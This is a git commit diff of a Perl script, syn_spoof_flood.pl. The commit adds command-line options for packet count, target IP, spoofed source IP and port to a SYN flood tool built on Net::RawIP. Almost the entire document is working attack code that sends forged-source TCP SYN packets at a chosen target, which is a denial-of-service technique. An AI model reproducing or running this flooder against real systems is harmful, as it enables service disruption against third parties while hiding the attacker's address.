fb547b6b473cc8366e553b08dae0a59b0b7b5eb3
forwardprefekt <mattd@grifsec.com>
2015-04-15 23:44:15 +0800

    added in options

--- syn_spoof_flood.pl
+++ syn_spoof_flood.pl
@@ -1,38 +1,43 @@
 #!/usr/bin/perl
 # synSpoofFlood
-# Author: Lucas Allan
+# Author: forwardprefekt
 #
-# Based on Simple SYN Flooder by iphelix
+# Based on Simple SYN Flooder by iphelix, Lucas Allen (www.lucasallan.com)
 # Requires perl, Net::RawIP module, and root privileges
 #
-# www.lucasallan.com
-#
- 
+
+$|=0; 
 use Net::RawIP;
- 
-sub geraIP(){
-    $range = 255;
-    $iA = int(rand($range));
-    $iB = int(rand($range));
-    $iC = int(rand($range));
-    $iD = int(rand($range));
- 
-    return $iA . "." . $iB . "." . $iC . "." . $iD;
-}
- 
+use Getopt::Std;
+
+my $helper = 'Required args:
+        -c count of packets to send
+        -t real target ip4 address (1.2.3.4)
+        -s spoofed source ip4 address (1.2.3.4)
+        -p target port
+';
+
+
+my %options=();
+
+getopts('c:t:s:p:', \%options) or die($helper);
+
+$counter = $options{"c"};
+$dst = $options{'t'};
+$src = $options{'s'};
+$port = $options{'p'};
+
 sub attack(){
-   ($dst,$port) = @ARGV;
    $a = new Net::RawIP;
-   while(1) {
+   while($counter > 0) {
       $src_port = rand(65534)+1;
-      $src = geraIP();
       $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
       $a->send;
+	$counter--;
+	if($counter % 100 ==0) {
+		printf("%d packets left...\n",$counter);
+	}
    }
 }
-if($#ARGV == 1) {
-    attack();
- 
-} else {
-   print "Target Port\n";
-}
+
+attack();
